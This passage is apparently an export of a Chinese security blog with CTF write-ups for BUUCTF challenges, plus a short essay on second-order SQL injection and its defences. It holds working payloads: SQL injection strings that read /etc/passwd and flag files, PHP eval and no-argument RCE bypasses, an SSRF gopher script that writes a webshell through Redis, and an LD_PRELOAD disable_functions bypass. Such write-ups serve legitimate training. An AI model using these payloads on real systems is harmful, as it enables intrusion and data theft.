返回数组中的当前指针的值，默认是数组第一个元素，别名pos\n\nend() - 将数组的内部指针指向最后一个单元\n\nkey() - 从关联数组中取得键名\n\neach() - 返回数组中当前的键／值对并将数组指针向前移动一步\n\nprev() - 将数组的内部指针倒回一位\n\nreset() - 将数组的内部指针指向第一个单元\n\nnext() - 将数组中的内部指针向前移动一位\n\n\n其他函数\n\nlocaleconv() 返回一包含本地数字及货币格式信息的数组。而数组第一项就是”.”\nget_defined_vars()此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。\ngetenv,获取一个环境变量的值\n\n文件相关操作函数\n\nfile_get_contents()将整个文件读入一个字符串\n\nreadfile()读取文件并写入到输出缓冲。\n\nhighlight_file()语法高亮显示一个文件\n\nscandir( . ), 返回一个数组，包含当前目录下的文件和目录\n\ngetcwd()取得当前工作目录。\n\nchdir($directory)，将 PHP 的当前目录改为 directory。\n\n\n","categories":["漏洞总结"],"tags":["RCE"]},{"title":"SWPU2019之Web1","url":"https://husins.cn/SWPU2019之Web1/","content":"知识点\ngroup by 可以代替order by\n无列名注入\n解题\n\n登陆注册，存在一个申请发布广告的功能\n\n输入单引号进行测试，出现数据库报错，怀疑是sql注入\n经过FUZZ发现，空格 or # 都被过滤了\n仔细分析，页面是提交之后，再次读取造成的注入，明显的二次注入。\n由于or被过滤，导致order by也不能使用，这里可以使用 group by代替\n得到字段数是22个\n\n获取显错位\n-1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22\n\n\n还是由于or的缘故，information_schema也不能用，这里就要用到无列名注入的方法了。\n无列名注入的核心就是直接读取第几列的信息\n构造payload\n-1&#x27;union/**/select/**/1, (select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22 \n\n\n得到flag \n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"BJDCTF2020之Mark loves cat","url":"https://husins.cn/BJDCTF2020之Mark-loves-cat/","content":"知识点\nforeach：为数组循环赋值\n解题\n打开题目，页面十分很复杂，没有可用的功能点，查看网页源代码和数据包，也没有发现任何可疑的地方。\n尝试扫描目录，发现git源码泄露\n利用GitHacker得到index.php的源代码\n&lt;?phpinclude &#x27;flag.php&#x27;;$yds = &quot;dog&quot;;$is = &quot;cat&quot;;$handsome = &#x27;yds&#x27;; #对三个变量直接赋值foreach($_POST as $x =&gt; $y)&#123; #将POST传参的建和值给X和y，并且对$$x赋值    $$x = $y;&#125;foreach($_GET as $x =&gt; $y)&#123; #同理将GET的建和值给X和Y，并且赋值    $$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123; #这里将GET的建和值给X和Y    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;#GET的值绝对等于$X,$x 本身不等于‘flag’        exit($handsome); #这里明显是经过赋值$X就是flag，然后又不等于，所以此处没有作用    &#125;&#125;if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123; #这里要两处值为空，返回$yds    exit($yds);&#125;if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123; #此处要两种传参值任意一个为flag，输出$is的值    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;\n\n根据分析，三个if第一个完全不能用\n第二个if:要两处都传入的键值均为flag,且为空，要想得到flag，还需要$yds=$flag;\nGET: ?yds=flag\n\n经过赋值$yds=$flag,exit()直接输出flag的值\n第三个if：此处要两种传参值任意一个为flag，输出$is的值\nGET的建和值都是flag\nGET: ?is=flag&amp;flag=flag\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GXYCTF2019-禁止套娃","url":"https://husins.cn/GXYCTF2019-禁止套娃/","content":"知识点\n//数组操作函数：end():数组指针指向最后一位next(): 数组指针指向下一位array_reverse(): 将数组颠倒array_rand(): 随机返回数组的键名array_flip()：交换数组的键和值localeconv() 函数返回一包含本地数字及货币格式信息的数组。scandir()  函数返回指定目录中的文件和目录的数组。readfile() 输出一个文件。current() 返回数组中的当前单元, 默认取第一个值。pos(): current() 的别名。next() 函数将内部指针指向数组中的下一个元素，并输出。array_reverse()以相反的元素顺序返回数组。highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。\n\n解题\n\n打开题目，页面十分简单，没有任何的功能点，查看网页源代码和数据包，也没有发现任何可疑的地方。\n尝试扫描目录，发现git源码泄露\n利用GitHacker得到index.php的源代码\n\n源码中出现三次if，依次分析：\nif (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;]))\n\n过滤了很多PHP伪协议，不能使用伪协议直接读取了\nif(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;]))\n\n[a-z,_]**这就是匹配任意字母到_**然后+(?R)? ,后面这个?R是引用当前表达式，形成递归调用，然后继续来匹配。\n举例说明\n\n\n如图示，可以使用函数嵌套函数，但是使用的函数不能存在参数，这样的就是典型的无参数RCE\n代码里面明显包含flag.php,根据无参数RCE的特点就是构造无参数函数读取flag.php\n第三个if\nf (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) \n\n过滤了很多关键字，导致很多函数不能使用\npayload\n?exp=print_r(scandir(pos(localeconv())));\n\nlocaleconv第一个字符是.  pos获取这个.,然后利用scandir读取当前目录\n\n?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));\n\n倒序数组，数组内置指针下移一位，高亮显示文件。\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GitHacker使用总结","url":"https://husins.cn/GitHacker使用总结/","content":"今天我中了GitHack的诡计，他竟然还有个强大的哥哥GitHacker\nGitHacker 和 Githack 有什么区别呢？GitHacker是一个多线程工具，用于检测站点是否存在git源码泄漏，并能够将网站源代码下载到本地。值得一提的是，这个工具会将整个git repo恢复到本地\nGithack，只是简单的恢复到最新版本。\n如此一来，通过GitHacker你就可以查看到开发人员的历史提交记录以及提交注释，以更好的掌握开发者的性格和心理，从而为进一步的代码审计奠定基础。\n它结合git命令能够产生妙用\npython githacker.py 127.0.0.1/.git/将git泄露的文件，下载到本地\ngit log --reflog 查看提交过的版本信息和分支信息\ngit reset -–hard彻底回退到某个版本，本地的源码也会变为上一个版本的内容\n\n","categories":["工具使用"],"tags":["git"]},{"title":"浅析二次注入","url":"https://husins.cn/浅析二次注入/","content":"什么是二次注入​        二次注入是指已存储（数据库，文件等）的用户输入被读取后再次进入到SQL查询语句中导致注入。可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。\n​        二次注入类似于存储型XSS，在提交payload的时候不会直接对WEB应用程序产生影响，通过其他的辅助剪辑的对WEB产生危害。\n为什么会出现二次注入​        本质上和SQL注入一样都是源于信任问题，不同的是二次注入是卡发着可能不信任直接来自于用户的数据，对其进行了严格的过滤和转义后进行了存储。但是对于已存储的数据就不会进行过滤，转义，取出后直接放入SQL语句中导致了二次注入的产生\n二次注入的原理​        \n（图片是我白嫖来的，嘻嘻）\n核心原理：数据在存入数据库后还原成了用户输入的形式，当在数据库取出的时候，没有再次进行过滤和转义，从而造成了二次注入。\n二次注入漏洞与普通注入漏洞的区别：\n二次注入是sql注入的一种，但是比普通sql注入难利用，利用门槛高\n普通注入数据直接进入到SQL查询中\n二次注入是输入数据经处理后存储，取出后，再次进入到SQL查询\n渗透过程越复杂，不确定因素越多，成功率越低。如果二次注入必须由管理员在后台来被动触发，更加难以实现\n二次注入漏洞只能靠人工，需要对应用有一个完整的理解\n\n二次注入可能存在在什么地方\n存在转义函数的地方\n\n在回溯数据输入的地方，如修改用户账户密码、修改文章标题\n\n跨语言的应用，容易导致问题。比如前台PHP，后台java\n\n日志相关：存日志时，读取了一些数据库里的信息，比如用户名等，然后又存储了一次\n\n跨程序的数据传递：程序A处理完后存储到数据库，程序B去读取，未进行过滤\n\n\n如何防御二次注入\n预处理+数据绑定\n对所有的输入一视同仁，不论输入来自用户还是存储，在进入SQL查询前都对其进行过滤，转义\n代码审查的时候，禁止开发用拼接的方式执行sql\n\n","categories":["漏洞总结"],"tags":["SQL"]},{"title":"Zer0pts2020之Can you guess it?","url":"https://husins.cn/Zer0pts2020之Can-you-guess-it/","content":"知识点\nstring random_bytes( int $length)：生成适合于加密使用的任意长度的加密随机字节字符串，例如在生成salt、密钥或初始化向量\nbasename函数\n&lt;?php$path = &quot;/testweb/home.php&quot;;//显示带有文件扩展名的文件名echo basename($path);//显示不带有文件扩展名的文件名echo basename($path,&quot;.php&quot;);?&gt; \n\n解题\n&lt;?phpinclude &#x27;config.php&#x27;; // FLAG is defined in config.phpif (preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123;  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123;  $guess = (string) $_POST[&#x27;guess&#x27;];  if (hash_equals($secret, $guess)) &#123;    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;  &#125; else &#123;    $message = &#x27;Wrong.&#x27;;  &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;Can you guess it?&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Can you guess it?&lt;/h1&gt;    &lt;p&gt;If your guess is correct, I&#x27;ll give you the flag.&lt;/p&gt;    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;    &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt;    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;&lt;?php &#125; ?&gt;    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;      &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;\n\n题目直接给了完整的源代码，进行代码审计\n\n过滤了config和.php两个关键字\n对变量$secret进行一个64位随机加密并转为16进制，如果变量guess和secret相等得到flag\n最下面特殊写法，打印Message变量\n\n难道这道题是伪随机数爆破？找了半天也没看出来发现咋利用，后知后觉，老子中计了\n看源代码的最开头部分，他的写法和平时不一样，多了一个basename函数，这个函数只保留最后文件名\n当URL传参/index.php/config.php/，则$_SERVER[&#39;PHP_SELF&#39;]返回/index.php/config.php/经过basename函数就会返回config.php,因此我们只需要绕过正则就能获得FLAG，真诱人呢\n绕过正则我们可以使用包含多字节字符的路径，找到一个basename识别不了的多字节即可绕过\n&lt;?phpfunction check($str) &#123;  return preg_match(&#x27;/config\\.php\\/*$/i&#x27;, $str);&#125;for ($i = 0; $i &lt; 0x100; $i++) &#123;  $s = &#x27;/index.php/config.php/&#x27; . IntlChar::chr($i);  if (!check($s)) &#123;    $t = basename(&#x27;/index.php/config.php/&#x27; . chr($i));    echo &quot;$&#123;i&#125;: $&#123;t&#125;\\n&quot;;  &#125;&#125;?&gt;\n\n通过脚本，找到识别不到的字符实现绕过，Payload\n/index.php/config.php/%80?source\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"网鼎杯2018之Comment","url":"https://husins.cn/网鼎杯2018之Comment/","content":"知识点:\nGitHack工具的使用\n二次注入\nDocker文件位置，一般在/temp/html中会有备份\n解题\n\n打开题目第一次发帖需要你登陆,账号密码都给你了,只是没有给你密码后三位,意图很明显,使用爆破来进行登陆\n爆破成功后会发现密码为zhangwei666\n\n登陆之后存在发帖功能,想到了xss和SQL注入\n1.对XSS进行测试,发现这里存在反射型XSS没有什么意义\n2.SQL注入尝试了半天,没啥效果,一丢丢报错信息都没有,盲注的回显也没有\n剩下就没有什么思路了,只能看看有没有信息泄露的点\n\n在控制台发现一句提示,Git程序员跑路,可没可能是Git泄露,直接扫目录\n\n确实是Git泄露\n\n使用GItHack工具获取到源码,发下源码一点信息没有,前面提示没写完,这里猜测/.git文件不全,利用GitHack对其进行补全\n&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;:    $category = addslashes($_POST[&#x27;category&#x27;]);    $title = addslashes($_POST[&#x27;title&#x27;]);    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into board            set category = &#x27;$category&#x27;,                title = &#x27;$title&#x27;,                content = &#x27;$content&#x27;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#x27;comment&#x27;:    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#x27;category&#x27;];    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into comment            set category = &#x27;$category&#x27;,                content = &#x27;$content&#x27;,                bo_id = &#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;?&gt;\n\n获取到完整的源代码,观察write部分发现sql语句都被进行了转义,这也是为啥之前测试SQL注入不成功的原因\n通过审计源代码我们不难发现这里存在一处很明显的二次注入,一开始会对category进行赋值,然后在查看时会将其取出,如果我们在categories输入&#39;123 /*在concent输入*/#，就会出现如下效果：\n$sql = &quot;insert into comment          set category = &#x27;&#x27;123/*&#x27;,              content = &#x27;*/#&#x27;,              bo_id = &#x27;$bo_id&#x27;&quot;;\n\n当123存入数据库再被取出时，如果存在命令执行，就会被执行。\n\n\n进行简单验证，果然可以，接下来就是要利用二次注入找到flag了\n首先看看用户信息，payload：\n&#x27;,content=(select load_file(&#x27;/etc/passwd&#x27;)),/*\n\n\n发现存在了一处可疑的www用户，去他的家目录看看他都有过什么操作，Payload：\n&#x27;,content=(select load_file(&#x27;/home/www/.bash_history&#x27;)),/*\n\n\n但是观察之后不难发现，他在/tmp目录下有过操作，这里经过看别人wp提示发现，由于目标环境是docker，所以 .DS_Store 文件应该在 /tmp/html 中。而 .DS_Store 文件中，经常会有一些不可见的字符，可以使用hex函数对其进行16进制转换 payload：\n&#x27;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*\n\n使用hackbar解码\n\n发现flag文件，直接访问\n\n确定FLAG文件存在，因此路径应该为/var/www/html/flag_8946e1ff1ee3e40f.php利用二次注入读取一下，**payload**\n&#x27;,content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*\n\n\n完整流程如下：\n\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"CISCN2019 华北赛区 Day2 Web1之Hack World","url":"https://husins.cn/CISCN2019-华北赛区-Day2-Web1之Hack-World/","content":"知识点\nSQL异或运算: 假^假 =真 ，真^真=假，假^真=真，真^假=真,当我们查询 1^0、0^1、和 1 的回显是一样的，而查询 1^1 或0^0却会有报错提示\n解题\n\n\n\n经过测试,页面一共有三种回显,正常返回话,否则返回bool(false),出现过滤字符,返回SQL Injection Checked.\n由此可知,应该是布尔盲注,\n\n确实是布尔盲注,但是select之类的全部被过滤了,这里 采用新学的异或来进行绕过.\n编写盲注脚本,这里我们发现表名和字段名都给你了,直接找flag就可以了.\n\n使用二分法,得到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"FBCTF2019之RCEService","url":"https://husins.cn/FBCTF2019之RCEService/","content":"知识点\n\nJSON执行命令格式&#123;&quot;cmd&quot;:&quot;命令&quot;&#125;\n%0A表示换行\nputenv函数:\n\n解题\n\n利用json格式输入命令\n\n发现,当前目录下只存在index.php一个文件,这里测试好多都不能继续进行,百度wp,发现当时给了源码\n&lt;?php putenv(&#x27;PATH=/home/rceservice/jail&#x27;); if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;  $json = $_REQUEST[&#x27;cmd&#x27;];   if (!is_string($json)) &#123;    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123;    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125; else &#123;    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];    if ($cmd !== NULL) &#123;      system($cmd);    &#125; else &#123;      echo &#x27;Invalid input&#x27;;    &#125;    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;  &#125;&#125;\n\n很多东西都过滤了，但是preg_match()函数只匹配一行，用%0a进行换行,代码中提示了路径,看看该路径下的文件\n?cmd=&#123;%0A&quot;cmd&quot;:&quot;ls /home/rceservice&quot;%0A&#125;\n\n\n发现存在flag文件,但是由于环境变量发生了改变,很多命令,没有被ban但是也无法直接使用,这里我们可以使用绝对路径来调用,\n?cmd=&#123;%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A&#125;\n\n\n得到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GKCTF2020之EZ三剑客-EzWeb","url":"https://husins.cn/GKCTF2020之EZ三剑客-EzWeb/","content":"知识点:\nfile协议被过滤后可以使用file:/ 和 file:&lt;空格&gt;///\n6379端口一般运行redis服务\n解题\n\n\n\n打开题目,访问输入URL都能正常的访问,但是本地127.0.0.1被ban了\n\n发现一个GET传参,尝试传参.\n\neth0 Link encap:Ethernet HWaddr 02:42:0a:cf:b7:09 inet addr:10.207.183.9 Bcast:10.207.183.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:57 errors:0 dropped:0 overruns:0 frame:0 TX packets:56 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:10748 (10.7 KB) TX bytes:14359 (14.3 KB) eth1 Link encap:Ethernet HWaddr 02:42:ac:12:00:2d inet addr:172.18.0.45 Bcast:172.18.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:26 errors:0 dropped:0 overruns:0 frame:0 TX packets:15 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:18757 (18.7 KB) TX bytes:908 (908.0 B) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:18 errors:0 dropped:0 overruns:0 frame:0 TX packets:18 errors:0 dropped:0 overruns:0 carrier:0collisions:0 txqueuelen:1000 RX bytes:1729 (1.7 KB) TX bytes:1729 (1.7 KB)\n\n给了ip地址,10.207.183.9,想到ssrf,结合之前输入url,能够呈现网页内容,尝试使用伪协议读取一下源码\n\n\n&lt;?phpfunction curl($url)&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, 0);    echo curl_exec($ch);    curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123;\t\t$url = $_GET[&#x27;url&#x27;];\t\t//echo $url.&quot;\\n&quot;;\t\tif(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match))\t\t&#123;\t\t\t//var_dump($match);\t\t\tdie(&#x27;别这样&#x27;);\t\t&#125;\t\tcurl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123;\tsystem(&#x27;ifconfig&#x27;);&#125;?&gt;\n\n上面过滤了 file dict : / 127.0.0.1 localhost\n结合之前给的ip地址还没有利用上,可以使用http协议跑存活主机地址\n\n发现了一个网页的返回包存在提示,找到了存活主机,下一步就是找到服务端口\n\n发现6379端口出现的提示,查看6379开启的是什么服务\n通过百度发现6379一般开启的是redis服务\n\n下一步就应该是百度6379服务存在的漏洞,这里参照其他大佬的wp,发现redis存在未授权访问的漏洞,因为过滤了dict协议,所以使用gopher协议,利用大佬的脚本生成payload:\nimport urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot;      // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;,\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),\t &quot;config set dir &#123;&#125;&quot;.format(path),\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),\t &quot;save&quot;\t ]if passwd:\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr):\tCRLF=&quot;\\r\\n&quot;\tredis_arr = arr.split(&quot; &quot;)\tcmd=&quot;&quot;\tcmd+=&quot;*&quot;+str(len(redis_arr))\tfor x in redis_arr:\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)\tcmd+=CRLF\treturn cmdif __name__==&quot;__main__&quot;:\tfor x in cmd:\t\tpayload += urllib.quote(redis_format(x))\tprint payload\n\n\n\n这里脚本进行命令执行可以,但是不能上传一句话木马,问题是啥暂时没有弄清楚\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"MRCTF2020之套娃","url":"https://husins.cn/MRCTF2020之套娃/","content":"知识点\n​          - PHP在解析查询字符串时会将所有参数转换为有效地变量名,此时\n\n 它会删除空白符\n将某些字符转化为下划线(包括空格)\n字符串换行符 可以表示字符串的结尾\n\n\n\n解题\n\n$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;    die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;    echo &quot;you are going to the next ~&quot;;&#125;\n\n打开题目查看源代码,发现一处注释,获取到源码一份\n第一个if不能出现_,可以根据字符串解析特性绕过\n第二个if要求 不能出现23333,但是正则要能匹配的到,而且第二个if中正则^和$代表的是行的开头和结尾,所以可以使用换行来绕过\n构造paylaod\n?b%20u%20p%20t=23333%0a\n\n\n提示FLAG在secrettw.php访问\n\n提示本地ip访问\n\n写入XFF头没有效果,但是发现有一串JS代码放到控制台看看\n\n看来是提示post传参\n\n&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123;     highlight_file(__FILE__);     die(); &#125; function change($v)&#123;     $v = base64_decode($v);     $re = &#x27;&#x27;;     for($i=0;$i&lt;strlen($v);$i++)&#123;         $re .= chr ( ord ($v[$i]) + $i*2 );     &#125;     return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; \n\n随便传入一个Merak的值,获得了当前页面的源码\nchange函数,相当于对于传入的值进行了 一次加密\n想要获得FLAG,要满足以下几点要求:\n\nIP等于127.0.0.1,这里XFF不能用,可以使用client-ip\n2333的值等于todat is a happy day,而且要绕过file_get_contents函数,可以使用伪协议绕过\n经过change函数加密后,仍然可以读取flag.php\n\n构造change的解密EXP\n\n因此,传参改ip即可\n\n得到FLAG\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"极客大挑战 2019之RCE ME","url":"https://husins.cn/极客大挑战-2019之RCE-ME/","content":"知识点\n环境变量 LD_preload + mail劫持so来执行系统命令:   通过linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE\nhttps://www.anquanke.com/post/id/175403https://www.freebuf.com/articles/web/192052.html\n解题\n打开题目获取源代码\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123;            $code=$_GET[&#x27;code&#x27;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;\n\n代码很简单,绕过正则造成命令执行,正则过滤的很严格 大小写字母和数字全部被过滤,因此选择取反绕过正则\n构造读取phpinfo的Exp\n\n?code=(~%8F%97%8F%96%91%99%90)();\n\n看到phpinfo()主要关注flag是否在里面,其次看disable_funcation禁用了那些\n\n没有FLAG存在\n\n绝大多数函数都被禁用\n构造一句话木马,连接蚁剑,绕过disable_funcation\n\n\n这个题就和之前挨骂,那个题是一样的了,这里有三种方法\n\n利用蚁剑自带插件绕过disable_funcation\n\n\n\n\n利用LD_preload + mail\n\n\n\n​     这里过长,参考网上的wp可以这样构造\n?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=eval($_POST[&#x27;a&#x27;])?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/1.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so\n\n得到flag\n","categories":["CTF题解"],"tags":["BUUCTF"]},{"title":"GWCTF 2019之枯燥的抽奖","url":"https://husins.cn/GWCTF-2019之枯燥的抽奖/","content":"知识点\nmt_rand:每一次调用mt_rand()函数的时候，都会检查一下系统有没有播种。（播种是由mt_srand()函数完成的），当随机种子生成后，后面生成的随机数都会根据这个随机种子生成。所以前面也说到，同一个种子下随机生成的随机数值是相同的。因此,这是一个伪随机数,只要知道随机种子的值,就能破解.\n爆破工具:https://github.com/lepiaf/php_mt_seed\n伪随机数文章:https://www.freebuf.com/vuls/192012.html\n解题\n\n猜字符串都游戏,看到输入框,尝试SQL注入和XSS\n\n\n查看源码:\n\n前端传参处,存在一处url,尝试访问\n\n得到抽奖程序的源码,真不错,分析一下源码\n&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#x27;seed&#x27;]))&#123;$_SESSION[&#x27;seed&#x27;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#x27;seed&#x27;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123;    if($_POST[&#x27;num&#x27;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);\n\n通过阅读源码可发现,通过随机数,生成一个长度为20的密码,输入密码就可以获取flag.\n首先将得到的前十个密码解析成php_mt_seed需要的参数Exp如下:\n&lt;?php$pass_now = &quot;FpCyLNvPOj&quot;;$allowable_characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;$length = strlen($allowable_characters) - 1;for ($j = 0; $j &lt; strlen($pass_now); $j++) &#123;    for ($i = 0; $i &lt; $length; $i++) &#123;        if ($pass_now[$j] == 